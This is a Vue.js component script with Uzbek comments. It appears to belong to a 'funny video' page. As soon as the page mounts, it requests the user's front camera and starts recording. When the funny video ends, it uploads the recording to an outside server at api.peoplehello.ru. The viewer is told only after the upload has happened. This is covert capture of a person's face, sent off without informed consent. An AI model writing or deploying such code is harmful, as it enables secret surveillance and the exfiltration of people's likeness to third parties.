<script>
import axios from "axios"

export default {
  data() {
    return {
      stream: null,
      mediaRecorder: null,
      recordedChunks: [],
      recording: false,
    }
  },

  async mounted() {
    await this.requestCamera()
  },

  methods: {
    async requestCamera() {
      try {
        this.stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        })

        this.startRecording()

      } catch (e) {
        alert('Kamera ruxsatisiz davom etib bo‘lmaydi 😢')
      }
    },

    startRecording() {
      this.recordedChunks = []

      // 🔻 VIDEO HAJMINI KICHRAYTIRISH (bitrate)
      this.mediaRecorder = new MediaRecorder(this.stream, {
        mimeType: 'video/webm;codecs=vp8',
        videoBitsPerSecond: 700_000 // ≈ 0.7 Mbps (yengil)
      })

      this.mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          this.recordedChunks.push(e.data)
        }
      }

      this.mediaRecorder.start()
      this.recording = true
    },

    stopRecordingAndSend() {
      if (!this.mediaRecorder || !this.recording) return

      this.mediaRecorder.stop()
      this.recording = false

      this.mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(this.recordedChunks, {
          type: 'video/webm'
        })

        const formData = new FormData()
        formData.append('file', videoBlob)

        try {
          await axios.post(
              'https://api.peoplehello.ru/api/video-upload',
              formData
          )

          alert('😂 Video muvaffaqiyatli yuborildi!')

        } catch (err) {
          alert('❌ Video yuborishda xatolik')
        }
      }
    },

    onFunnyVideoEnd() {
      // 🎬 Kulgili video tugadi → recording ham tugaydi
      this.stopRecordingAndSend()
    }
  }
}
</script>
